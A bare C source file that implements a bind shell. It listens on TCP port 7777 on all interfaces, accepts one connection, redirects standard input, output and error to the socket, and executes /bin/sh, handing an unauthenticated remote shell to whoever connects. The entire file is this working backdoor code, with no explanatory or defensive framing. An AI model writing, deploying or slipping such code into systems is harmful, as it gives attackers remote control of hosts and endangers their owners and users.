#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(7777),
        .sin_addr.s_addr = htonl(INADDR_ANY)
    };

    int ssock = socket(AF_INET, SOCK_STREAM, 0);

    bind(ssock, (struct sockaddr*) &sa, sizeof(sa));

    listen(ssock, 0);

    int csock = accept(ssock, NULL, NULL);

    dup2(csock, 0);
    dup2(csock, 1);
    dup2(csock, 2);

    return execve("/bin/sh", 0, 0);
}
